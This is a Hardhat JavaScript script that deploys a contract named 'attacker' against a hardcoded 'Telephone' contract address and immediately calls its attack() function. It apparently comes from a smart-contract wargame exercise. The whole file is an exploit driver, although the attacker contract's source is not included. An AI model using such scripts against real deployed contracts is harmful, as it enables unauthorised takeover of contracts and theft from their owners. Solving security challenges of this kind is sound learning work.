const { ethers } = require("hardhat");


const ATTACKER_NAME = "attacker";
const TelephoneContract="0xbe77935A8B065aa87d4FCacb975f3F6aB37c9Cd6"


async function main() {

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(TelephoneContract);
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);

  await attackerContract.attack();

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});